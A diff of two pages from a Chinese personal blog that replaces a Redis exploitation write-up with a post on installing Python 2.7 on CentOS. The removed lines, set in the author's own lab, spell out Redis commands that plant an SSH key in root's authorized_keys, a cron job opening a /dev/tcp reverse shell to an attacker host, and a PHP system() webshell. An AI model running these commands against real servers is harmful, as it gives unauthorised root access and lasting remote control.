@@ -15,23 +15,16 @@
 
 
 
-<meta name="description" content="REDIS 远程利用
-自己搭建的环境， 两台机器都是CENTOS7， REDIS版本是3.2.4. 其中REDIS-SERVER所在的主机IP是 10.1.1.212 ， 攻击机是在 10.1.1.100。 但是REDIS在新版本中是默认允许远程连接的。 所以这里用 protected-mode no来模拟。 至于实际环境中可以用SSRF来利用。">
+<meta name="description" content="之前一直在用Ubuntu系统，并没有接触过这一个问题，后来发现centos在稳定性与系统资源占用上还是略优于Ubuntu的。虽然界面比较丑.. Anyway, 在使用Centos时，不可避免的要接触到python版本的问题。 系统自带的Python版本是2.6, 而且yum依赖的也是2.6版本。但是很多工具要求使用python2.7版本。 不得不提一句，python的版本太乱了，且不兼容。 所以">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Redis利用小结">
-<meta property="og:url" content="http://yoursite.com/2017/03/04/redis利用小结/index.html">
+<meta property="og:title" content="centos切换python2.7">
+<meta property="og:url" content="http://yoursite.com/2017/07/16/centos切换python2-7/index.html">
 <meta property="og:site_name" content="shin's blog">
-<meta property="og:description" content="REDIS 远程利用
-自己搭建的环境， 两台机器都是CENTOS7， REDIS版本是3.2.4. 其中REDIS-SERVER所在的主机IP是 10.1.1.212 ， 攻击机是在 10.1.1.100。 但是REDIS在新版本中是默认允许远程连接的。 所以这里用 protected-mode no来模拟。 至于实际环境中可以用SSRF来利用。">
-<meta property="og:image" content="http://ojv4vdr4o.bkt.clouddn.com/redis-redis_1.png">
-<meta property="og:image" content="http://ojv4vdr4o.bkt.clouddn.com/redis-redis_2.png">
-<meta property="og:image" content="http://ojv4vdr4o.bkt.clouddn.com/redis-redis_3.png">
-<meta property="og:updated_time" content="2017-03-04T12:42:59.000Z">
+<meta property="og:description" content="之前一直在用Ubuntu系统，并没有接触过这一个问题，后来发现centos在稳定性与系统资源占用上还是略优于Ubuntu的。虽然界面比较丑.. Anyway, 在使用Centos时，不可避免的要接触到python版本的问题。 系统自带的Python版本是2.6, 而且yum依赖的也是2.6版本。但是很多工具要求使用python2.7版本。 不得不提一句，python的版本太乱了，且不兼容。 所以">
+<meta property="og:updated_time" content="2017-07-16T07:48:42.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Redis利用小结">
-<meta name="twitter:description" content="REDIS 远程利用
-自己搭建的环境， 两台机器都是CENTOS7， REDIS版本是3.2.4. 其中REDIS-SERVER所在的主机IP是 10.1.1.212 ， 攻击机是在 10.1.1.100。 但是REDIS在新版本中是默认允许远程连接的。 所以这里用 protected-mode no来模拟。 至于实际环境中可以用SSRF来利用。">
-<meta name="twitter:image" content="http://ojv4vdr4o.bkt.clouddn.com/redis-redis_1.png">
+<meta name="twitter:title" content="centos切换python2.7">
+<meta name="twitter:description" content="之前一直在用Ubuntu系统，并没有接触过这一个问题，后来发现centos在稳定性与系统资源占用上还是略优于Ubuntu的。虽然界面比较丑.. Anyway, 在使用Centos时，不可避免的要接触到python版本的问题。 系统自带的Python版本是2.6, 而且yum依赖的也是2.6版本。但是很多工具要求使用python2.7版本。 不得不提一句，python的版本太乱了，且不兼容。 所以">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -63,7 +56,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>Redis利用小结 | shin&#39;s blog</title>
+<title>centos切换python2.7 | shin&#39;s blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -224,11 +217,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-redis利用小结" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-centos切换python2-7" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2017/03/04/redis利用小结/" class="article-date">
-      <time datetime="2017-03-04T12:36:02.000Z" itemprop="datePublished">2017-03-04</time>
+      <a href="/2017/07/16/centos切换python2-7/" class="article-date">
+      <time datetime="2017-07-16T07:10:55.000Z" itemprop="datePublished">2017-07-16</time>
 </a>
 
 
@@ -243,7 +236,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      Redis利用小结
+      centos切换python2.7
     </h1>
   
 
@@ -254,7 +247,7 @@
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web安全/">web安全</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux/">linux</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -264,107 +257,21 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h1 id="REDIS-远程利用"><a href="#REDIS-远程利用" class="headerlink" title="REDIS 远程利用"></a>REDIS 远程利用</h1><blockquote>
-<p>自己搭建的环境， 两台机器都是CENTOS7， REDIS版本是3.2.4. 其中REDIS-SERVER所在的主机IP是 10.1.1.212 ， 攻击机是在 10.1.1.100。 但是REDIS在新版本中是默认允许远程连接的。 所以这里用 <code>protected-mode no</code>来模拟。 至于实际环境中可以用SSRF来利用。</p>
+        <blockquote>
+<p>之前一直在用Ubuntu系统，并没有接触过这一个问题，后来发现centos在稳定性与系统资源占用上还是略优于Ubuntu的。虽然界面比较丑.. Anyway, 在使用Centos时，不可避免的要接触到python版本的问题。 系统自带的Python版本是2.6, 而且yum依赖的也是2.6版本。但是很多工具要求使用python2.7版本。 不得不提一句，python的版本太乱了，且不兼容。 所以需要将Centos的python版本改为2.7。 这里总结了一下网上的方法，将自己成功安装的经验POST上来。</p>
 </blockquote>
+<h1 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h1><ol>
+<li>Centos: 6.X</li>
+<li>Python: 2.7</li>
+</ol>
 <a id="more"></a>
-<h2 id="0x00-REDIS-常用命令"><a href="#0x00-REDIS-常用命令" class="headerlink" title="0x00 REDIS 常用命令"></a>0x00 REDIS 常用命令</h2><p><a href="https://redis.readthedocs.io/en/2.4/index.html" target="_blank" rel="external">redis 命令参考简体中文版</a></p>
-<ol>
-<li><p>操作String。</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">set key value  # 设置键值对</div><div class="line">GET key     # 返回键对应的值.</div><div class="line">exists key  # 判断键是否存在</div><div class="line">del key   # 删除键</div><div class="line">strlen key # 返回key的长度</div></pre></td></tr></table></figure>
-</li>
-<li><p>操作Hash</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">hset key field value # 将一个key的字段赋值</div><div class="line">hset person name &quot;shinpachi8&quot;</div><div class="line">hmset key field value field2 value2  # 对一个键多个字段同时赋值</div><div class="line">hgetall key # 返回key中所有字段的值。</div><div class="line">hexsits key field # 查看key中的field字段是否存在。</div><div class="line">hlen key # 返回哈希表 key 中的字段总数</div><div class="line">hdel key field [field] # 删除一个或多个字段</div></pre></td></tr></table></figure>
-</li>
-<li><p>操作列表</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">lpush key value [value2] # 将 一个或多个值</div><div class="line">lpop key # 移出列表的第一个值并返回</div><div class="line">lrange key start stop # 返回指定范围内的元素</div><div class="line">llen key # 列表key 的长度</div><div class="line">lset key index value # 用下标来设置值</div></pre></td></tr></table></figure>
-</li>
-<li><p>操作集合</p>
-<blockquote>
-<p>是string 的无序集合，集合成员是唯一的。 添加/删除/查找 的时间复杂度都是o(1)</p>
-</blockquote>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">sadd key value1 [value2] # 向集合添加一个或多个值</div><div class="line">sdiff key1 key2 # 返回不同集合之间的差值</div><div class="line">spop key # 返回key中的一个随机值并删除它</div><div class="line">sunion key1 key2 # 返回并集</div></pre></td></tr></table></figure>
-</li>
-<li><p>redis 备份与恢复</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">save # 保存文件</div><div class="line">bgsave # 在后台保存文件</div></pre></td></tr></table></figure>
-<p>如果在恢复，只需要将备份文件(dump.rdb) 保存在redis安装目录并启动服务即可。</p>
-</li>
-</ol>
-<h2 id="0x01-远程登录查看INFO"><a href="#0x01-远程登录查看INFO" class="headerlink" title="0x01 远程登录查看INFO"></a>0x01 远程登录查看INFO</h2><blockquote>
-<p>在这里可以长个心眼，如果版本在这之上的，还可以远程连接，有可能是蜜罐…</p>
-</blockquote>
-<p><img src="http://ojv4vdr4o.bkt.clouddn.com/redis-redis_1.png" alt="远程登录查看info"></p>
-<h2 id="0x02-拿SHELL"><a href="#0x02-拿SHELL" class="headerlink" title="0x02 拿SHELL"></a>0x02 拿SHELL</h2><ol>
-<li><p>通过写入 rsa的公钥来远程登录。</p>
-<blockquote>
-<p>其实也可以写入其他用户目录下，但是一般来说REDIS多用ROOT权限登录，直接写入/root/目录下可以省去猜用户的步骤</p>
-</blockquote>
-<ul>
-<li><p>生成rsa公私钥对。</p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh-keygen -t rsa</div></pre></td></tr></table></figure>
-</li>
-<li><p>将公钥写入 文件中</p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; foo.txt</div></pre></td></tr></table></figure>
-</li>
-<li><p>然后利用 redis-cli 的 管道技术将值设置进去, 然后再进入redis, 更改其配置文件与数据库名，保存。</p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$cat foo.txt | redis-cli -h 10.1.1.212 -x set crackredis</div><div class="line">$redis-cli -h 10.1.1.212  # 连接，以下操作在redis-cli 命令行中进行</div><div class="line">$10.1.1.212:6379&gt; CONFIG SET dir /root/.ssh/</div><div class="line">$10.1.1.212:6379&gt; CONFIG set dbfilename &quot;authorized_keys&quot;</div><div class="line">$10.1.1.212:6379&gt; save</div></pre></td></tr></table></figure>
-</li>
-<li><p>然后用私钥连接目标即可。</p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh -i id_rsa root@10.1.1.212</div></pre></td></tr></table></figure>
-</li>
-</ul>
-</li>
-<li><p>通过写入 <code>crontab</code> (计划性任务) 来反弹 shell</p>
-<blockquote>
-<p>在测试时用 flush all 将数据删除，在实际中可以不用。或者先保存，再删除，之后再恢复。</p>
-</blockquote>
-<ul>
-<li><p>删除所有数据</p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$10.1.1.212:6379&gt; FLUSHALL</div><div class="line">$10.1.1.212:6379&gt;exit</div></pre></td></tr></table></figure>
-</li>
-<li><p>用管道来将计划任务写入redis中, 或者之前不退出，直接写入。 其中 set 1 的意思是将内容的健设置为1，这样保证保存的时候在最前边。</p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">echo &quot;\n\n */1 * * * * bash -i &gt;&amp; /dev/tcp/10.1.1.100/2333 0&gt;&amp;1 \n\n&quot; | redis-cli -h 10.1.1.212 -x set 1</div><div class="line">redis-cli -h 10.1.1.212</div><div class="line">$10.1.1.212:6379&gt; CONFIG set dir /var/spool/cron</div><div class="line">$10.1.1.212:6379&gt; CONFIG set dbfilename root</div><div class="line">$10.1.1.212:6379&gt; save</div></pre></td></tr></table></figure>
-</li>
-<li><p>然后再本机监控 2333端口</p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -l -p 2333</div></pre></td></tr></table></figure>
-</li>
-</ul>
-</li>
-</ol>
-<p><img src="http://ojv4vdr4o.bkt.clouddn.com/redis-redis_2.png" alt="监听的端口"></p>
-<ol>
-<li><p>写一个WEBSHELL。</p>
-<blockquote>
-<p>同样，在测试环境中，首先将所有的数据 flushall掉。</p>
-</blockquote>
-<ul>
-<li><p>直接登录</p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">redis-cli -h 10.1.1.212</div><div class="line">10.1.1.212:6379&gt; CONFIG SET dir /var/www/html/</div><div class="line">10.1.1.212:6379&gt; CONFIG SET dbfilename &quot;test.php&quot;</div><div class="line">10.1.1.212:6379&gt; set a &quot;&lt;?php system($_GET[&apos;cmd&apos;])?&gt;&quot;</div><div class="line">10.1.1.212:6379&gt; save</div></pre></td></tr></table></figure>
-</li>
-<li><p>浏览器访问</p>
-</li>
-</ul>
-</li>
-</ol>
-<p><img src="http://ojv4vdr4o.bkt.clouddn.com/redis-redis_3.png" alt="写webshell"></p>
-<ol>
-<li><p>写一个webshell</p>
-<blockquote>
-<p>这里不将数据 flushall， 这时候需要考虑的是在写入的键包含<code>?&gt;</code> 或者 <code>&lt;?</code> 可以破坏PHP结构的语句。 同时以防数据量过大超时。 可以将文件写成一个写入文件的shell。</p>
-</blockquote>
-<ul>
-<li><p>直接写入文件</p>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">redis-cli -h 10.1.1.212</div><div class="line"></div><div class="line"># 写入内容为:</div><div class="line">&lt;?php</div><div class="line">    set_time_limit(0);</div><div class="line">    $fp=fopen(&quot;webshell.php&quot;,&quot;w&quot;);</div><div class="line">    fwrite($fp,&quot;&lt;?php system($_GET[&apos;cmd&apos;])?&gt;&quot;);</div><div class="line">    exit();</div><div class="line">?&gt;</div><div class="line"></div><div class="line">// 或者用file_put_contents()</div></pre></td></tr></table></figure>
-<p>  但是这个我在的实验环境中没有成功。</p>
-</li>
-</ul>
-</li>
-</ol>
-<h2 id="0x03-参考连接"><a href="#0x03-参考连接" class="headerlink" title="0x03 参考连接"></a>0x03 参考连接</h2><ol>
-<li><a href="https://www.secpulse.com/archives/39440.html" target="_blank" rel="external">redis写shell的小技巧</a></li>
-<li><a href="http://blog.knownsec.com/2015/11/analysis-of-redis-unauthorized-of-expolit/" target="_blank" rel="external">Redis 未授权访问配合 SSH key 文件利用分析</a></li>
-<li><a href="https://www.secpulse.com/archives/5357.html" target="_blank" rel="external">利用redis写webshell</a></li>
-</ol>
+<h1 id="升级安装"><a href="#升级安装" class="headerlink" title="升级安装"></a>升级安装</h1><h2 id="安装依赖包"><a href="#安装依赖包" class="headerlink" title="安装依赖包"></a>安装依赖包</h2><p>Python需要安装额外的依赖包SSL, bz2, zlib<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum install -y zlib-devel bzip2-devel openssl-devel xz-libs wget</div></pre></td></tr></table></figure></p>
+<h2 id="下载Python源码并安装"><a href="#下载Python源码并安装" class="headerlink" title="下载Python源码并安装"></a>下载Python源码并安装</h2><p>下载python2.7并解压，配置路径为<code>/usr/local</code>, 然后安装</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">wget https://www.python.org/ftp/python/2.7.13/Python-2.7.13.tgz</div><div class="line">tar zxvf Python-2.7.13.tgz</div><div class="line"><span class="built_in">cd</span> Python-2.7.13</div><div class="line">./configure prefix=/usr/<span class="built_in">local</span></div><div class="line">make</div><div class="line">make install</div></pre></td></tr></table></figure>
+<h2 id="设置PATH"><a href="#设置PATH" class="headerlink" title="设置PATH"></a>设置PATH</h2><p>为了更方便的使用python, 需要将python的目录加入到PATH中, 但是奇怪的是,  这个时候我已经可以用python2.7了, 并且可以使用yum.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">export</span> PATH=<span class="string">'/usr/local/bin:$PATH'</span>,</div><div class="line"><span class="comment"># 或</span></div><div class="line">ln <span class="_">-s</span> /usr/<span class="built_in">local</span>/bin/python2.7  /usr/bin/python</div></pre></td></tr></table></figure></p>
+<h2 id="更改YUM"><a href="#更改YUM" class="headerlink" title="更改YUM"></a>更改YUM</h2><p>因为YUM使用的Python2.6，所以要在软链之后的yum默认使用脚本来更改一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">vim /usr/bin/yum</div><div class="line"># 将#! /usr/bin/python</div><div class="line"># 改为 /usr/bin/python2.6</div></pre></td></tr></table></figure></p>
+<h2 id="添加PIP"><a href="#添加PIP" class="headerlink" title="添加PIP"></a>添加PIP</h2><p>首先要安装 setuptools，才能安装pip<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">wget https://pypi.python.org/packages/25/c1/344fdd1f543cba2d38c6fb7db86f2ffc468e72006487005e50df08f0243d/setuptools-36.2.0.zip#md5=60df703040ad8024d24727dc95483740</div><div class="line">unzip -x setuptools-36.2.0.zip</div><div class="line">cd setuptools-36.2.0</div><div class="line">python setup.py install</div><div class="line"></div><div class="line">wget https://pypi.python.org/packages/11/b6/abcb525026a4be042b486df43905d6893fb04f05aac21c32c638e939e447/pip-9.0.1.tar.gz#md5=35f01da33009719497f01a4ba69d63c9</div><div class="line">tar zvxf pip-9.0.1</div><div class="line">cd pip-9.0.1</div><div class="line">python steup.py install</div></pre></td></tr></table></figure></p>
+<p>到此大功告成，可以愉快的使用python2.7了。</p>
 
       
     </div>
@@ -373,13 +280,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2017/03/04/redis利用小结/">Redis利用小结</a></p>
+        <p><span>本文标题:</span><a href="/2017/07/16/centos切换python2-7/">centos切换python2.7</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">Shinpachi8</a></p>
-        <p><span>发布时间:</span>2017-03-04, 20:36:02</p>
-        <p><span>最后更新:</span>2017-03-04, 20:42:59</p>
+        <p><span>发布时间:</span>2017-07-16, 15:10:55</p>
+        <p><span>最后更新:</span>2017-07-16, 15:48:42</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2017/03/04/redis利用小结/" title="Redis利用小结">http://yoursite.com/2017/03/04/redis利用小结/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2017/03/04/redis利用小结/　　作者: Shinpachi8" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2017/07/16/centos切换python2-7/" title="centos切换python2.7">http://yoursite.com/2017/07/16/centos切换python2-7/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2017/07/16/centos切换python2-7/　　作者: Shinpachi8" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -391,16 +298,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2017/03/17/njctf2017-writeup-md/">
-                    Njctf2017-Writeup
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2017/02/22/lfi/">
-                    本地文件包含简单练习
+                <a href="/2017/04/12/信息收集工具之处理subDomainBrute结果/">
+                    信息收集工具之处理subDomainBrute结果
                 </a>
             </div>
         
@@ -412,7 +313,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#REDIS-远程利用"><span class="toc-number">1.</span> <span class="toc-text">REDIS 远程利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-REDIS-常用命令"><span class="toc-number">1.1.</span> <span class="toc-text">0x00 REDIS 常用命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-远程登录查看INFO"><span class="toc-number">1.2.</span> <span class="toc-text">0x01 远程登录查看INFO</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-拿SHELL"><span class="toc-number">1.3.</span> <span class="toc-text">0x02 拿SHELL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-参考连接"><span class="toc-number">1.4.</span> <span class="toc-text">0x03 参考连接</span></a></li></ol></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#版本"><span class="toc-number">1.</span> <span class="toc-text">版本</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#升级安装"><span class="toc-number">2.</span> <span class="toc-text">升级安装</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#安装依赖包"><span class="toc-number">2.1.</span> <span class="toc-text">安装依赖包</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#下载Python源码并安装"><span class="toc-number">2.2.</span> <span class="toc-text">下载Python源码并安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#设置PATH"><span class="toc-number">2.3.</span> <span class="toc-text">设置PATH</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#更改YUM"><span class="toc-number">2.4.</span> <span class="toc-text">更改YUM</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#添加PIP"><span class="toc-number">2.5.</span> <span class="toc-text">添加PIP</span></a></li></ol></li></ol>
         
     </div>
     <style>
@@ -448,7 +349,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"Redis利用小结　| shin's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"centos切换python2.7　| shin's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -464,7 +365,7 @@
     
       <div class="duoshuo" id="comments">
     <div id="comment-box" ></div>
-    <div class="ds-thread" id="ds-thread" data-thread-key="2017/03/04/redis利用小结/" data-title="Redis利用小结" data-url="http://yoursite.com/2017/03/04/redis利用小结/"></div>
+    <div class="ds-thread" id="ds-thread" data-thread-key="2017/07/16/centos切换python2-7/" data-title="centos切换python2.7" data-url="http://yoursite.com/2017/07/16/centos切换python2-7/"></div>
     <script>
         var duoshuoQuery = {short_name:"shinpachi8"};
         var loadComment = function(){
@@ -477,7 +378,7 @@
         
             // Add comment count
             $(function(){ 
-                var jsonUrl = "http://api.duoshuo.com/threads/counts.jsonp?short_name=shinpachi8&threads=2017/03/04/redis利用小结/&callback=?";
+                var jsonUrl = "http://api.duoshuo.com/threads/counts.jsonp?short_name=shinpachi8&threads=2017/07/16/centos切换python2-7/&callback=?";
                 $.getJSON(jsonUrl, function(result){
                     $.each(result.response, function(i, field){
                         var value = field.comments;
@@ -524,15 +425,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2017/03/17/njctf2017-writeup-md/" title="上一篇: Njctf2017-Writeup">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2017/02/22/lfi/" title="下一篇: 本地文件包含简单练习">
+            <a href="/2017/04/12/信息收集工具之处理subDomainBrute结果/" title="下一篇: 信息收集工具之处理subDomainBrute结果">
                 <i class="fa fa-angle-right"></i>
             </a>
         
